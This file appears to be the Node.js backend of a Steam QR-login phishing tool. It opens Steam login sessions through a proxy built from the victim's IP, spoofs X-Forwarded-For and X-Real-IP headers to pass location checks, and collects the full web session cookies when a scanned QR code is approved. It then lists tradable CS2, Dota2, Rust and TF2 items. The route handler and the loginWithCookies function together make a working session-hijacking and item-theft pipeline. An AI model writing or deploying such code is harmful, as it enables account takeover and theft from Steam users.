const express = require('express');
const router = express.Router();
const SteamUser = require('steam-user')
const { LoginSession, EAuthTokenPlatformType } = require('steam-session');
const SteamCommunity = require('steamcommunity');
const community = new SteamCommunity();
const QR = require('qrcode');
const geoip = require('geoip-lite')
const { HttpsProxyAgent } = require('https-proxy-agent');
const proxyAgent = new HttpsProxyAgent('http://172.71.146.125:3128');

// Store active sessions (for SSE)
const activeSessions = new Map();
const client = new SteamUser()

router.post('/', async (req, res) => {
    const userIpRaw  = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const userIp = (userIpRaw === '::1' || userIpRaw === '127.0.0.1') ? null : userIpRaw;


    if (!userIp) {
        // fallback proxy or no proxy at all
        console.log("User IP is local, skipping proxy or use default proxy");
    }
    console.log(userIp)
    try {
        
        const proxyUrl = userIp ? `http://${userIp}:3128` : 'http://your.default.proxy:3128';


        const proxyAgent = new HttpsProxyAgent(proxyUrl);
        
        // 2. Create session with proxy and proper headers
        const session = new LoginSession({
            platformType: EAuthTokenPlatformType.WebBrowser,
            httpAgent: proxyAgent,
            httpsAgent: proxyAgent,
            headers: {
                'X-Forwarded-For': userIp,
                'X-Real-IP': userIp,
                'Accept-Language': 'en-US',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        });
        session.loginTimeout = 120000; // 2 minutes timeout
        const startResult = await session.startWithQR()
        // Generate QR code
        const qrImageUrl = await QR.toDataURL(startResult.qrChallengeUrl);

        // Create a unique session ID
        const sessionId = `sess_${Date.now()}`;
        activeSessions.set(sessionId, session);

        // Return initial QR code data
        res.status(200).json({
            success: true,
            sessionId,
            qrImageUrl,
        });

    } catch (error) {
        console.error('Error generating QR:', error);
        res.status(500).json({ success: false, error: "Failed to generate QR" });
    }
});

// SSE Endpoint for real-time updates
router.get('/events/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = activeSessions.get(sessionId);

    if (!session) {
        return res.status(404).end();
    }

    // SSE headers
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    // Event handlers
    session.on('remoteInteraction', () => {
        res.write(`event: scanned\ndata: ${JSON.stringify({ message: "QR scanned! Waiting for approval..." })}\n\n`);
    });

    session.on('authenticated', async () => {
        const cookies = await session.getWebCookies();
        const inventory = await loginWithCookies(cookies)
        res.write(`event: authenticated\ndata: ${JSON.stringify({ message: "Login successful!", cookies, inventory })}\n\n`);
        res.end();
        activeSessions.delete(sessionId); // Cleanup
    });

    session.on('timeout', () => {
        res.write(`event: timeout\ndata: ${JSON.stringify({ message: "Session timed out." })}\n\n`);
        res.end();
        activeSessions.delete(sessionId);
    });

    session.on('error', (err) => {
        res.write(`event: error\ndata: ${JSON.stringify({ error: err.message })}\n\n`);
        res.end();
        activeSessions.delete(sessionId);
    });

    // Handle client disconnect
    req.on('close', () => {
        if (session && !session.isAuthenticated) {
            session.cancelLoginAttempt();
            activeSessions.delete(sessionId);
        }
    });
});

module.exports = router;





// Game configurations
const GAMES = {
    CS2: { appid: 730, contextid: 2 },
    DOTA2: { appid: 570, contextid: 2 },
    RUST: { appid: 252490, contextid: 2 },
    TF2: { appid: 440, contextid: 2 }
};

async function loginWithCookies(cookies) {
    try {
        // Set cookies and get SteamID
        community.setCookies(cookies);
        const steamID =  community.steamID.getSteamID64();
        
        // Load all inventories in parallel
        const inventoryPromises = Object.entries(GAMES).map(async ([gameName, config]) => {
            try {
                const inventory = await getInventory(steamID, config.appid, config.contextid);
                return {
                    game: gameName,
                    items: processInventoryItems(inventory)
                };
            } catch (error) {
                console.error(`Failed to load ${gameName} inventory:`, error);
                return {
                    game: gameName,
                    items: [],
                    error: error.message
                };
            }
        });

        // Wait for all inventories to load
        const gameInventories = await Promise.all(inventoryPromises);

        // Convert to object format { CS2: [...], DOTA2: [...], ... }
        const inventories = {};
        gameInventories.forEach(result => {
            inventories[result.game] = result.items;
        });

        return {
            steamID,
            inventories
        };

    } catch (error) {
        console.error('Error in loginWithCookies:', error);
        throw error;
    }
}


function getInventory(steamID, appid, contextid) {
    return new Promise((resolve, reject) => {
        community.getUserInventoryContents(
            steamID,
            appid,
            contextid,
            true, // tradable only
            (err, inventory) => {
                if (err) return reject(err);
                resolve(inventory);
            }
        );
    });
}

function processInventoryItems(inventory) {
    return inventory.map(item => ({
        assetid: item.assetid,
        name: item.market_hash_name,
        icon: item.icon_url,
        icon_large: item.icon_url_large,
        tradable: item.tradable,
        marketable: item.marketable,
        type: item.type,
        amount: item.amount
    }));
}





































// Example usage:
// const cookies = [...]; // Get these from your authentication flow
// loginWithCookies(cookies)
//     .then(data => console.log('Inventory data:', data))
//     .catch(err => console.error('Failed:', err));